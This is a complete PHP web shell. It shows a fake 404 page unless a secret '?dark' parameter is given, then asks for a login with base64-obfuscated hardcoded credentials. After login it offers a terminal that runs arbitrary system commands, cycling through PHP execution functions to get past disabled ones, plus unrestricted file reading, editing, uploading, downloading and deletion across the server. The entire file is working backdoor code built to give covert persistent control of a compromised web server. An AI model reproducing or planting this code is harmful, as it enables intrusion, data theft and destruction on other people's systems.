<?php
if (!isset($_GET['dark'])) {
    http_response_code(404);
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}
session_start();
$AUTH_USER = base64_decode('YWRtaW4=');
$AUTH_PASS = base64_decode('c3ViaGFtZGFsbGU=');

$_qp = 'dark';
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?$_qp");
    exit;
}

if(isset($_POST['login_user']) && isset($_POST['login_pass'])) {
    if($_POST['login_user'] === $AUTH_USER && $_POST['login_pass'] === $AUTH_PASS) {
        $_SESSION['auth'] = true;
        $_SESSION['user'] = $AUTH_USER;
        header("Location: ?$_qp");
        exit;
    } else {
        $login_error = true;
    }
}

if(empty($_SESSION['auth'])) {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
*{margin:0;padding:0}
body{font-family:monospace;background:#0d1117;color:#c9d1d9;display:flex;justify-content:center;align-items:center;height:100vh}
.login{background:#161b22;padding:30px;border-radius:8px;border:1px solid #30363d;width:400px}
.login h2{color:#58a6ff;margin-bottom:20px;text-align:center}
.login input{width:100%;padding:12px;background:#010409;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;margin-bottom:15px;font-family:monospace;font-size:14px}
.login button{width:100%;padding:12px;background:#58a6ff;color:#000;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
.error{background:#f85149;color:#fff;padding:10px;border-radius:6px;margin-bottom:15px;text-align:center}
</style>
</head>
<body>
<div class="login">
<h2>🔒 Login</h2>
<?php if(isset($login_error)): ?>
<div class="error">Invalid!</div>
<?php endif; ?>
<form method="post">
<input type="text" name="login_user" placeholder="Username" required autofocus>
<input type="password" name="login_pass" placeholder="Password" required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>
<?php
exit;
}

// Actions
$a = isset($_POST['a']) ? $_POST['a'] : (isset($_GET['a']) ? $_GET['a'] : '');

// Terminal - Multiple fallback methods
if($a == 'cmd') {
    header('Content-Type: application/json');
    $c = isset($_POST['c']) ? $_POST['c'] : '';
    $o = '';
    $method = '';
    
    // Try different methods
    if(function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $o = @shell_exec($c . ' 2>&1');
        $method = 'shell_exec';
    }
    elseif(function_exists('exec')) {
        $ar = array();
        @exec($c . ' 2>&1', $ar);
        $o = implode("\n", $ar);
        $method = 'exec';
    }
    elseif(function_exists('system')) {
        ob_start();
        @system($c . ' 2>&1');
        $o = ob_get_clean();
        $method = 'system';
    }
    elseif(function_exists('passthru')) {
        ob_start();
        @passthru($c . ' 2>&1');
        $o = ob_get_clean();
        $method = 'passthru';
    }
    elseif(function_exists('popen')) {
        $fp = @popen($c, 'r');
        if($fp) {
            while(!feof($fp)) {
                $o .= fread($fp, 1024);
            }
            pclose($fp);
            $method = 'popen';
        }
    }
    elseif(function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($c, $descriptorspec, $pipes);
        if(is_resource($process)) {
            fclose($pipes[0]);
            $o = stream_get_contents($pipes[1]);
            $o .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $method = 'proc_open';
        }
    }
    
    if(empty($o)) {
        $disabled = explode(',', ini_get('disable_functions'));
        $o = "No output. Available methods: ";
        $available = array();
        if(function_exists('shell_exec')) $available[] = 'shell_exec';
        if(function_exists('exec')) $available[] = 'exec';
        if(function_exists('system')) $available[] = 'system';
        if(function_exists('passthru')) $available[] = 'passthru';
        if(function_exists('popen')) $available[] = 'popen';
        if(function_exists('proc_open')) $available[] = 'proc_open';
        $o .= empty($available) ? 'NONE (all disabled)' : implode(', ', $available);
        $o .= "\nDisabled functions: " . (empty($disabled[0]) ? 'none' : implode(', ', array_map('trim', $disabled)));
    }
    
    die(json_encode(array('o' => $o ? $o : '(no output)', 'pwd' => getcwd(), 'method' => $method)));
}

// Read file
if($a == 'read') {
    header('Content-Type: application/json');
    $f = isset($_POST['f']) ? $_POST['f'] : '';
    die(json_encode(array('ok' => is_file($f), 'd' => is_file($f) ? file_get_contents($f) : '')));
}

// Save file
if($a == 'save') {
    header('Content-Type: application/json');
    $f = isset($_POST['f']) ? $_POST['f'] : '';
    $c = isset($_POST['c']) ? $_POST['c'] : '';
    die(json_encode(array('ok' => @file_put_contents($f, $c) !== false)));
}

// Delete
if($a == 'del') {
    header('Content-Type: application/json');
    $f = isset($_POST['f']) ? $_POST['f'] : '';
    $ok = is_file($f) ? @unlink($f) : @rmdir($f);
    die(json_encode(array('ok' => $ok)));
}

// Rename
if($a == 'ren') {
    header('Content-Type: application/json');
    $old = isset($_POST['old']) ? $_POST['old'] : '';
    $new = isset($_POST['new']) ? $_POST['new'] : '';
    die(json_encode(array('ok' => @rename($old, $new))));
}

// Upload
if($a == 'up' && isset($_FILES['fi'])) {
    header('Content-Type: application/json');
    $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
    $target = $dir . '/' . basename($_FILES['fi']['name']);
    $ok = move_uploaded_file($_FILES['fi']['tmp_name'], $target);
    die(json_encode(array('ok' => $ok)));
}

// Download
if($a == 'dl') {
    $f = isset($_GET['f']) ? $_GET['f'] : '';
    if(is_file($f) && is_readable($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        readfile($f);
        exit;
    }
}

// New file/folder
if($a == 'new') {
    header('Content-Type: application/json');
    $p = isset($_POST['path']) ? $_POST['path'] : '';
    $t = isset($_POST['type']) ? $_POST['type'] : 'file';
    if($t == 'file') {
        $ok = @file_put_contents($p, '') !== false;
    } else {
        $ok = @mkdir($p, 0755, true);
    }
    die(json_encode(array('ok' => $ok, 'path' => $p)));
}

$d = isset($_GET['d']) ? $_GET['d'] : getcwd();
if(!is_dir($d)) $d = getcwd();
$d = realpath($d);

$dirs = array();
$files = array();

// Use glob instead of scandir
$entries = glob($d . '/*');
if(!$entries) $entries = array();

// Add hidden files
$hidden = glob($d . '/.*');
if($hidden) {
    foreach($hidden as $h) {
        if(basename($h) != '.' && basename($h) != '..') {
            $entries[] = $h;
        }
    }
}

foreach($entries as $p) {
    $n = basename($p);
    if(is_dir($p)) {
        $dirs[] = array('n' => $n, 'p' => $p);
    } else {
        $files[] = array('n' => $n, 'p' => $p, 's' => filesize($p));
    }
}

sort($dirs);
sort($files);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:13px monospace;background:#0d1117;color:#c9d1d9;padding:20px}
.header{background:#161b22;padding:20px;border-radius:6px;margin-bottom:20px;border:1px solid #30363d}
.header h1{font-size:18px;color:#58a6ff;margin-bottom:15px}
.path{background:#010409;padding:10px;border-radius:4px;color:#8b949e;word-break:break-all;margin-bottom:10px}
.stats{color:#8b949e;font-size:12px}
.nav{margin:15px 0}
.btn{display:inline-block;padding:8px 16px;background:#21262d;color:#c9d1d9;text-decoration:none;border-radius:6px;border:1px solid #30363d;font-size:13px}
.btn:hover{background:#30363d}
.list{background:#161b22;border-radius:6px;border:1px solid #30363d;max-height:calc(100vh - 300px);overflow-y:auto}
.item{padding:12px 20px;border-bottom:1px solid #21262d;display:grid;grid-template-columns:30px 1fr 120px 200px;gap:15px;align-items:center}
.item:hover{background:#1f2428}
.item:last-child{border:none}
.icon{font-size:16px}
.name{color:#c9d1d9;overflow:hidden;text-overflow:ellipsis}
.name a{color:#58a6ff;text-decoration:none}
.name a:hover{text-decoration:underline}
.size{color:#8b949e;font-size:11px;text-align:right}
.empty{padding:40px;text-align:center;color:#8b949e}
</style>
</head>
<body>
<div class="header">
<h1>File Manager</h1>
<div class="path"><?php echo htmlspecialchars($d); ?></div>
<div class="stats">
Directories: <strong><?php echo count($dirs); ?></strong> | 
Files: <strong><?php echo count($files); ?></strong>
</div>
<div class="nav">
<?php if($d != '/'): ?>
<a href="?<?php echo $_qp; ?>&d=<?php echo urlencode(dirname($d)); ?>" class="btn">⬆ Parent Directory</a>
<?php endif; ?>
<a href="?<?php echo $_qp; ?>" class="btn">🏠 Home</a>
<button class="btn" onclick="show('upM')">📤 Upload</button>
<button class="btn" onclick="show('newM')">➕ New</button>
<a href="?<?php echo $_qp; ?>&logout" class="btn" style="background:#f85149;color:#fff">🔒 Logout</a>
</div>
</div>

<div class="list">
<?php if(count($dirs) == 0 && count($files) == 0): ?>
<div class="empty">No files or directories found</div>
<?php else: ?>
<?php foreach($dirs as $i): ?>
<div class="item">
<div class="icon">📁</div>
<div class="name">
<a href="?<?php echo $_qp; ?>&d=<?php echo urlencode($i['p']); ?>"><?php echo htmlspecialchars($i['n']); ?></a>
</div>
<div class="size">-</div>
<div class="actions">
<button onclick="ren('<?php echo addslashes($i['p']); ?>','<?php echo addslashes($i['n']); ?>')">Rename</button>
<button onclick="del('<?php echo addslashes($i['p']); ?>')">Delete</button>
</div>
</div>
<?php endforeach; ?>
<?php foreach($files as $i): ?>
<div class="item">
<div class="icon">📄</div>
<div class="name"><?php echo htmlspecialchars($i['n']); ?></div>
<div class="size"><?php echo number_format($i['s']); ?> B</div>
<div style="display:flex;gap:5px">
<button onclick="ren('<?php echo addslashes($i['p']); ?>','<?php echo addslashes($i['n']); ?>')">Rename</button>
<button onclick="editFile('<?php echo addslashes($i['p']); ?>')" style="padding:4px 8px;background:#333;color:#eee;border:1px solid #555;font-size:10px;cursor:pointer">Edit</button>
<button onclick="location.href='?<?php echo $_qp; ?>&a=dl&f=<?php echo urlencode($i['p']); ?>'" style="padding:4px 8px;background:#333;color:#eee;border:1px solid #555;font-size:10px;cursor:pointer">Download</button>
<button onclick="deleteFile('<?php echo addslashes($i['p']); ?>')" style="padding:4px 8px;background:#333;color:#eee;border:1px solid #555;font-size:10px;cursor:pointer">Delete</button>
</div>
</div>
<?php endforeach; ?>
<?php endif; ?>
</div>


<!-- Terminal Panel -->
<div style="background:#161b22;border-radius:6px;border:1px solid #30363d;margin-top:20px">
<div style="padding:10px;border-bottom:1px solid #30363d;color:#58a6ff;font-weight:bold">Terminal</div>
<div style="display:flex;flex-direction:column;height:300px">
<div id="termOut" style="flex:1;overflow-y:auto;padding:10px;background:#000;color:#0f0;white-space:pre-wrap;font-family:monospace">Ready
PWD: <?php echo $d; ?>

</div>
<div style="display:flex;padding:10px;gap:10px;border-top:1px solid #30363d">
<input id="termCmd" placeholder="$ command..." autocomplete="off" style="flex:1;padding:8px;background:#000;color:#0f0;border:1px solid #444;font-family:monospace">
<button onclick="runCmd()" style="padding:8px 16px;background:#58a6ff;color:#000;border:none;cursor:pointer;font-weight:bold">Run</button>
</div>
</div>
</div>

<!-- Rename Modal -->
<div style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);align-items:center;justify-content:center;z-index:1001" id="renM">
<div style="background:#222;padding:20px;max-width:500px;width:90%">
<h3 style="color:#58a6ff;margin-bottom:15px">Rename</h3>
<input id="oldPath" type="hidden">
<input id="newName" placeholder="New name..." style="width:100%;padding:10px;background:#000;color:#eee;border:1px solid #444;font-family:monospace;margin-bottom:15px">
<div style="display:flex;gap:10px">
<button onclick="doRename()" style="padding:8px 20px;background:#58a6ff;color:#000;border:none;cursor:pointer;font-weight:bold">Rename</button>
<button onclick="closeAll()" style="padding:8px 20px;background:#333;color:#eee;border:none;cursor:pointer">Cancel</button>
</div>
</div>
</div>

<!-- Upload Modal -->
<div style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);align-items:center;justify-content:center;z-index:1001" id="upM">
<div style="background:#222;padding:20px;max-width:500px;width:90%">
<h3 style="color:#58a6ff;margin-bottom:15px">Upload File</h3>
<form id="upForm" enctype="multipart/form-data">
<input type="file" name="fi" style="width:100%;padding:10px;color:#eee;margin-bottom:15px">
<input type="hidden" name="a" value="up">
<input type="hidden" name="dir" value="<?php echo htmlspecialchars($d); ?>">
</form>
<div style="display:flex;gap:10px">
<button onclick="doUpload()" style="padding:8px 20px;background:#58a6ff;color:#000;border:none;cursor:pointer;font-weight:bold">Upload</button>
<button onclick="closeAll()" style="padding:8px 20px;background:#333;color:#eee;border:none;cursor:pointer">Cancel</button>
</div>
</div>
</div>

<!-- New File/Folder Modal -->
<div style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);align-items:center;justify-content:center;z-index:1001" id="newM">
<div style="background:#222;padding:20px;max-width:500px;width:90%">
<h3 style="color:#58a6ff;margin-bottom:15px">Create New</h3>
<input id="newPath" placeholder="Name..." style="width:100%;padding:10px;background:#000;color:#eee;border:1px solid #444;font-family:monospace;margin-bottom:10px">
<select id="newType" style="width:100%;padding:10px;background:#000;color:#eee;border:1px solid #444;margin-bottom:15px">
<option value="file">File</option>
<option value="folder">Folder</option>
</select>
<div style="display:flex;gap:10px">
<button onclick="doNew()" style="padding:8px 20px;background:#58a6ff;color:#000;border:none;cursor:pointer;font-weight:bold">Create</button>
<button onclick="closeAll()" style="padding:8px 20px;background:#333;color:#eee;border:none;cursor:pointer">Cancel</button>
</div>
</div>
</div>

<script>
// Additional functions
function show(id) { document.getElementById(id).style.display = 'flex'; }
function closeAll() { 
    var modals = ['renM', 'upM', 'newM', 'modal'];
    modals.forEach(function(m) { 
        var el = document.getElementById(m);
        if(el) el.style.display = 'none';
    });
}

function ren(path, name) {
    document.getElementById('oldPath').value = path;
    document.getElementById('newName').value = name;
    show('renM');
}

function doRename() {
    var old = document.getElementById('oldPath').value;
    var newName = document.getElementById('newName').value;
    var newPath = old.substring(0, old.lastIndexOf('/')) + '/' + newName;
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=ren&old=' + encodeURIComponent(old) + '&new=' + encodeURIComponent(newPath)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if(d.ok) location.reload();
        else alert('Failed to rename');
    });
}

function doUpload() {
    var form = document.getElementById('upForm');
    var formData = new FormData(form);
    fetch('?dark', {method: 'POST', body: formData})
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if(d.ok) location.reload();
        else alert('Failed to upload');
    });
}

function doNew() {
    var path = '<?php echo $d; ?>/' + document.getElementById('newPath').value;
    var type = document.getElementById('newType').value;
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=new&path=' + encodeURIComponent(path) + '&type=' + type
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if(d.ok) location.reload();
        else alert('Failed to create');
    });
}

function runCmd() {
    var input = document.getElementById('termCmd');
    var cmd = input.value.trim();
    if(!cmd) return;
    addTerm('$ ' + cmd);
    input.value = '';
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=cmd&c=' + encodeURIComponent(cmd)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        addTerm(d.o);
        addTerm('PWD: ' + d.pwd + '\n');
    });
}

function addTerm(text) {
    var out = document.getElementById('termOut');
    out.textContent += text + '\n';
    out.scrollTop = out.scrollHeight;
}

// Terminal enter key
var termCmd = document.getElementById('termCmd');
if(termCmd) {
    termCmd.addEventListener('keypress', function(e) {
        if(e.key === 'Enter') runCmd();
    });
}

// Update existing functions to use closeAll
var originalCloseModal = window.closeModal;
window.closeModal = closeAll;

// Alias del function
function del(path) {
    if(typeof deleteFile !== 'undefined') {
        deleteFile(path);
    } else {
        if(!confirm('Delete: ' + path + '?')) return;
        fetch('?dark', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'a=del&f=' + encodeURIComponent(path)
        })
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if(d.ok) location.reload();
            else alert('Failed to delete');
        });
    }
}
</script>

</body>
</html>
<!-- Modals and JavaScript -->
<div style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);align-items:center;justify-content:center" id="modal">
<div style="background:#222;padding:20px;max-width:800px;width:90%;max-height:80vh;display:flex;flex-direction:column">
<h3 id="modalTitle" style="color:#58a6ff;margin-bottom:15px"></h3>
<textarea id="editContent" style="width:100%;height:400px;padding:10px;background:#000;color:#0f0;border:1px solid #444;font-family:monospace;resize:vertical"></textarea>
<div style="margin-top:15px;display:flex;gap:10px">
<button onclick="saveFile()" style="padding:8px 20px;background:#58a6ff;color:#000;border:none;cursor:pointer;font-weight:bold">Save</button>
<button onclick="closeModal()" style="padding:8px 20px;background:#333;color:#eee;border:none;cursor:pointer">Cancel</button>
</div>
</div>
</div>

<script>
let editingFile = '';
function editFile(path) {
    editingFile = path;
    document.getElementById('modalTitle').textContent = 'Edit: ' + path;
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=read&f=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(d => {
        if(d.ok) {
            document.getElementById('editContent').value = d.d;
            document.getElementById('modal').style.display = 'flex';
        } else {
            alert('Cannot read file');
        }
    });
}

function saveFile() {
    const content = document.getElementById('editContent').value;
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=save&f=' + encodeURIComponent(editingFile) + '&c=' + encodeURIComponent(content)
    })
    .then(r => r.json())
    .then(d => {
        if(d.ok) {
            alert('File saved!');
            closeModal();
            location.reload();
        } else {
            alert('Failed to save');
        }
    });
}

function deleteFile(path) {
    if(!confirm('Delete: ' + path + '?')) return;
    fetch('?dark', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'a=del&f=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(d => {
        if(d.ok) location.reload();
        else alert('Failed to delete');
    });
}

function closeModal() {
    document.getElementById('modal').style.display = 'none';
}
</script>

